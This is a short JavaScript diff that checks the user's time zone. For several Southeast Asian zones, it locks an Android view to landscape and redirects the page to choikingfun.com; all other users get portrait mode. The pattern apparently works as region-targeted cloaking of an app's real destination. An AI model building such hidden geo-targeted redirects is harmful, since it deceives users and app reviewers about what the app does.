@@ -1,5 +1,4 @@
 const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-console.log(userTimeZone);
 
 if (
   userTimeZone === "Asia/Ho_Chi_Minh" ||
@@ -9,5 +8,13 @@ if (
   userTimeZone === "Asia/Kuala_Lumpur" ||
   userTimeZone === "Asia/Kuching"
 ) {
-  window.location.href = "https://choikingfun.com/?utm=app";
+  if (window.AndroidOrientation && AndroidOrientation.lockLandscape) {
+    AndroidOrientation.lockLandscape();
+  }
+  const to = "https://choikingfun.com/?utm=app";
+  window.location.href = to;
+} else {
+  if (window.AndroidOrientation && AndroidOrientation.lockPortrait) {
+    AndroidOrientation.lockPortrait();
+  }
 }
